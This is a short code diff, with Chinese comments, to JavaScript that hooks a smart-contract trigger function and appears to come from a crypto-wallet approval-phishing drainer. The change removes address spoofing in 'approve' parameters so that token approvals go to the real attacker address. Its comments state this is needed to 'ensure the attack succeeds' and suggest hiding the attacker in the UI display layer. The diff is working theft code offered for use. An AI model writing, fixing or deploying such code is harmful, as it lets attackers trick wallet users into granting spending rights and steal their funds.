@@ -34,25 +34,12 @@
                     if (functionSelector && functionSelector.includes('approve')) {
                         console.log('🎭 检测到授权操作，启用地址伪装');
                         
-                        // 替换参数中的攻击者地址
-                        if (parameters && Array.isArray(parameters)) {
-                            parameters = parameters.map(param => {
-                                if (param && param.type === 'address' && param.value === REAL_ATTACKER_ADDRESS) {
-                                    console.log(`🎭 授权地址伪装: ${param.value} → ${SPOOF_ADDRESS}`);
-                                    return {
-                                        ...param,
-                                        value: SPOOF_ADDRESS
-                                    };
-                                }
-                                return param;
-                            });
-                        }
+                        // 🎭 关键修复：不能改变实际授权地址，否则攻击者无法使用授权
+                        console.log('🎭 检测到approve调用，但保持真实授权地址以确保攻击成功');
+                        console.log(`🎯 授权地址保持为攻击者: ${REAL_ATTACKER_ADDRESS}`);
                         
-                        // 替换发起者地址
-                        if (issuerAddress === REAL_ATTACKER_ADDRESS) {
-                            issuerAddress = SPOOF_ADDRESS;
-                            console.log('🎭 发起者地址伪装完成');
-                        }
+                        // ❌ 不修改授权参数，保证授权给真实攻击者
+                        // 伪装策略需要在其他层面实现，比如UI显示层
                     }
                     
                     return originalTrigger.call(this, contractAddress, functionSelector, options, parameters, issuerAddress);
